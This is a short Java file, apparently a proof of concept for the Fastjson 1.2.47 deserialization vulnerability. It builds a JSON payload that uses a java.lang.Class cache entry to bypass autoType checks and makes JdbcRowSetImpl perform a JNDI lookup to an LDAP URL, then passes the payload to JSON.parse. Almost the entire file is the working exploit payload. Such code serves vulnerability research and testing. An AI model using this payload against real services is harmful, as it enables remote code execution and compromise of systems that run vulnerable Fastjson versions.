package POC;

import com.alibaba.fastjson.JSON;

/**
 * Created by metaStor on 2020/7/11.
 */
public class POC_1_2_47 {

    public static void main(String[] args) {
        String payload1 = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:9999/Calc\"," +
                "\"autoCommit\":true}}}";
        JSON.parse(payload1);
    }
}
